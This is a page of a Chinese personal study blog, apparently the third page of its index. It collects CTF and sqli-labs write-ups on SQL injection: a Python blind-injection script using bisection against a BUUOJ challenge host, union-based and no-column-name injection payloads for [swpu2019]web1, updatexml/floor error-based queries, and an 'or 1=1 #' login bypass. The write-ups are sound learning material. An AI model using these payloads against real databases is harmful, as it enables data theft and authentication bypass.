@@ -1,0 +1,1524 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="ctf&#x2F;python&#x2F;c++">
+<meta property="og:type" content="website">
+<meta property="og:title" content="wds&#39;s 学习博客">
+<meta property="og:url" content="http://example.com/page/3/index.html">
+<meta property="og:site_name" content="wds&#39;s 学习博客">
+<meta property="og:description" content="ctf&#x2F;python&#x2F;c++">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="wang deshan">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/page/3/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>wds's 学习博客</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="wds's 学习博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">wds's 学习博客</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">个人势学习分享网站，闲记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wang deshan"
+      src="/uploads/avatar.jpg">
+  <p class="site-author-name" itemprop="name">wang deshan</p>
+  <div class="site-description" itemprop="description">ctf/python/c++</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+
+
+
+<div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/19/wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/19/wp/" class="post-title-link" itemprop="url">finalsql</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-19 20:53:10" itemprop="dateCreated datePublished" datetime="2021-11-19T20:53:10+08:00">2021-11-19</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-27 19:33:32" itemprop="dateModified" datetime="2022-02-27T19:33:32+08:00">2022-02-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="第一次写盲注脚本"><a href="#第一次写盲注脚本" class="headerlink" title="第一次写盲注脚本"></a>第一次写盲注脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">280</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        url = <span class="string">&quot;http://5ab2fc5d-f744-4401-9552-f1b496e7e678.node4.buuoj.cn:81/search.php&quot;</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查库</span></span><br><span class="line">        <span class="comment">#payload =&quot;?id=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查列</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查表</span></span><br><span class="line">        <span class="comment">#payload=&quot;?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#查字段</span></span><br><span class="line">        payload= <span class="string">&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment">#查password</span></span><br><span class="line">        url+=payload</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Cl&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> (mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#print(chr(mid))</span></span><br><span class="line">    flag += <span class="built_in">chr</span> (mid)</span><br><span class="line">    <span class="comment">#print(mid)</span></span><br><span class="line">    <span class="comment">#print(chr(mid))</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="总结步骤"><a href="#总结步骤" class="headerlink" title="总结步骤"></a>总结步骤</h1><ol>
+<li>fuzz查过滤</li>
+<li>考虑查注入</li>
+<li>然后写脚本</li>
+</ol>
+<p><img src="https://i.loli.net/2021/11/19/n5blAoWmT41eLUJ.png" alt="QQ截图20211119210158.png"></p>
+<p>根据提示，尝试对？id=进行fuzz</p>
+<p>发现空格和and和||和$$被过滤了</p>
+<p>而^没有被过滤</p>
+<p>尝试用1^^1</p>
+<p><img src="https://i.loli.net/2021/11/19/dH3Y57PkpW9xgLF.png" alt="QQ截图20211119211628.png"></p>
+<p>可以利用可行的注入符合提供思路</p>
+<p>“1^ 0 ^ 1”为假</p>
+<p>“1 ^ 1 ^ 1”为真来嵌套语句</p>
+<h1 id="利用二分法来简化爆破"><a href="#利用二分法来简化爆破" class="headerlink" title="利用二分法来简化爆破"></a>利用二分法来简化爆破</h1><p>32是空格，ascii最多到127，所以可显字符是32到127</p>
+<p>我们取中间数为mid为80，high为128，low为32（方便除二）</p>
+<p>若这个要猜的值比80大，就到80到128的区间类取中值比较，以此类推，因为这个数必是整数，所以必可以找到。</p>
+<p><img src="https://i.loli.net/2021/11/19/CFx2wMBOHc5yViq.png" alt="QQ截图20211119212958.png"></p>
+<p>最后在一大堆password里面找到。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/14/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">无列名注入</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-14 21:04:50" itemprop="dateCreated datePublished" datetime="2021-11-14T21:04:50+08:00">2021-11-14</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-23 12:50:56" itemprop="dateModified" datetime="2022-02-23T12:50:56+08:00">2022-02-23</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="sql注入之无名注入"><a href="#sql注入之无名注入" class="headerlink" title="sql注入之无名注入"></a>sql注入之无名注入</h1><p>在我们进行sql注入的时候，有时候information_schema这个库可能会因为过滤而无法调用，这时我们就不能通过这个库来查出表名和列名。不过我们可以通过两种方法来查出表名：</p>
+<p>InnoDb引擎<br>从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>sys数据库<br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46330722/article/details/109605941">文章截取csdn</a></p>
+<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>指已经被存入数据库的值被误解读为错误指令。</p>
+<p>一般出现在读取值的过程中有各种过滤，然后对读取数据库时不进行过滤或转义。</p>
+<h1 id="swpu2019-web1"><a href="#swpu2019-web1" class="headerlink" title="[swpu2019]web1"></a>[swpu2019]web1</h1><p>先注册账号</p>
+<p>然后就可以上传广告（上传广告就是把值存入数据库）</p>
+<p>然后分别测试在广告名和广告内容注入，发现广告名可以注入，但是有很多的过滤。</p>
+<p><img src="https://i.loli.net/2021/11/14/Zke9TQvxtF2W4mg.png" alt="QQ截图20211114220531.png"></p>
+<p>用/**/来代替空格，利用union select 查出字段数和回显</p>
+<p><img src="https://i.loli.net/2021/11/14/vIu7FfEXd65pyJQ.png" alt="QQ截图20211114222329.png"></p>
+<p>发现2，3位置回显，</p>
+<p><img src="https://i.loli.net/2021/11/14/pw2KetuCxYDmOL7.png" alt="QQ截图20211114222514.png"></p>
+<p>查库</p>
+<p><img src="https://i.loli.net/2021/11/14/B3xUqzE9JAVnvfl.png" alt="QQ截图20211114223621.png"></p>
+<p>查表（出现没有）</p>
+<p><img src="https://i.loli.net/2021/11/14/7n9YZdX4VzyxeaA.png" alt="QQ截图20211114223712.png"></p>
+<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name)/<strong>/from/</strong>/information_schema.tables/<strong>/where/</strong>/table.schema=database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1</p>
+<p>这里的information_schema被过滤了不能用，所以我们要换一个库来查table_name和column_name</p>
+<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/<strong>/from/</strong>/mysql.innodb_table_stats/<strong>/where/</strong>/database_name=database()&amp;&amp;’1’=’1</p>
+<p>但是这个引擎没有存列名</p>
+<p>所以要利用无列名注入。</p>
+<p>-1’union/<strong>/select/</strong>/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/<strong>/from/</strong>/mysql.innodb_table_stats/<strong>/where/</strong>/database_name=database()&amp;&amp;’1’=’1</p>
+<p>用mysql.innodb_table_stats代替information_schema.tables查出表</p>
+<p><img src="https://i.loli.net/2021/11/16/kJuyev3L5zHcio8.png" alt="QQ截图20211116221604.png"></p>
+<p>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>2</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select*from/</strong>/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1</p>
+<p><img src="https://i.loli.net/2021/11/16/siyhoeba1frqQL3.png" alt="QQ截图20211116222056.png"></p>
+<p>查询</p>
+<p>-1’/<strong>/union/</strong>/select/<strong>/1,(select/</strong>/group_concat(<code>3</code>)/<strong>/from/</strong>/(select/<strong>/1,2,3/</strong>/union/<strong>/select*from/</strong>/users)n),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;’1’=’1’</p>
+<p><img src="https://i.loli.net/2021/11/16/Nbk9mvRZyiJg5t6.png" alt="QQ截图20211116222453.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/10/less17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/10/less17/" class="post-title-link" itemprop="url">less17-</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-10 19:51:06" itemprop="dateCreated datePublished" datetime="2021-11-10T19:51:06+08:00">2021-11-10</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-10 20:23:08" itemprop="dateModified" datetime="2022-02-10T20:23:08+08:00">2022-02-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="less17的注入过滤"><a href="#less17的注入过滤" class="headerlink" title="less17的注入过滤"></a>less17的注入过滤</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>substr（$value，0,15）；首先截取前16个字符</p>
+<p>magic_quotes_gpc()函数在php中作用是判断用户提供数据，如包括有：post，get，cookie过来的数据增加转义字符“\”,以确保这些数据不会引起程序的错误</p>
+<p>ctype_digit()判断是不是纯的数字</p>
+<p> mysql_real_escape_string()调用mysql库的函数 mysql_real_escape_string,在以下字符前添加反斜杠：\x00,\n,\r,,‘,”,和\x1a，默认字符集。</p>
+<p><img src="https://i.loli.net/2021/11/10/AyNRDwTH7zcB5xV.png" alt="QQ浏览器截图20211110212406.png"></p>
+<p>只截取前16个字符，的同时注释（\）单引号</p>
+<p>但是它对密码部分没做注入过滤，所以只要有正确的账号就可以尝试在passwd=后面进行注入</p>
+<h1 id="UPDATEXML-XML-document-XPath-string-new-value-函数"><a href="#UPDATEXML-XML-document-XPath-string-new-value-函数" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value)函数"></a>UPDATEXML (XML_document, XPath_string, new_value)函数</h1><p>XML_document是string格式，为XMl文档对象的名称</p>
+<p>XPath_string(Xpath格式的字符串)</p>
+<p>new_value为string格式，替换查找符合条件的数据</p>
+<p>该函数用于改变文档中符合条件的节点的值，意为改变XML_document中符合XPATH_string的值</p>
+<p>利用concat()函数只是将其拼接成字符串格式，来利用UPDATEXML (XML_document, XPath_string, new_value)函数报错出XPath_string的值</p>
+<p>select updatexml(1,concat(0x7e,(database())),1);</p>
+<p>select updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1);</p>
+<p>select updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table.schema=’security’ limit 0,1)),1);</p>
+<h1 id="补充（2022-01-29）：常用floor函数的报错注入"><a href="#补充（2022-01-29）：常用floor函数的报错注入" class="headerlink" title="补充（2022 01 29）：常用floor函数的报错注入"></a>补充（2022 01 29）：常用floor函数的报错注入</h1><p>floor函数：向下取整</p>
+<p>rand函数：随机取数，诺有参数x，则使每一个x对应一个固定的值，如果连续多次执行会变化，但是可以预测。</p>
+<p>floor（rand（0）*2）产生的随机数序列为011011.。。。</p>
+<h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>利用数据库主键不能重复的原理，使用group by 分组，产生主键重复而导致报错</p>
+<p>详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45146120/article/details/100062786?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">csdn  dalao</a>的文章</p>
+<p>因为发现好像lesson5，6也可以用报错来注入所以就在这里补充了</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/less11-16/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="wang deshan">
+      <meta itemprop="description" content="ctf/python/c++">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wds's 学习博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/11/06/less11-16/" class="post-title-link" itemprop="url">less11-16</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-11-06 11:00:03" itemprop="dateCreated datePublished" datetime="2021-11-06T11:00:03+08:00">2021-11-06</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-11-10 19:49:58" itemprop="dateModified" datetime="2021-11-10T19:49:58+08:00">2021-11-10</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="less-11"><a href="#less-11" class="headerlink" title="less 11"></a>less 11</h1><p>这关让我们输入账号密码，而不是简单的?id=1，所以直接夹断.</p>
+<p><img src="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png" alt="QQ截图20211106114439.png"></p>
+<p>代理抓包发现题与以往不同</p>
+<p>以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password</p>
+<p>但是本质上还是之前的报错注入，不过是基于post的提交方式</p>
+<p><img src="https://i.loli.net/2021/11/06/13BEjwb6MlFcCOD.png" alt="QQ截图20211106115325.png"></p>
+<p>利用抓包得到的信息可知上传的data为：uname=&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>所以基于此，进行报错注入</p>
+<p>首先我们不知道账号密码，利用注释符和 or 1=1使其为真</p>
+<p>uname=n‘ or 1=1 #&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>这样无论账号存不存在都可以登入（猜的）</p>
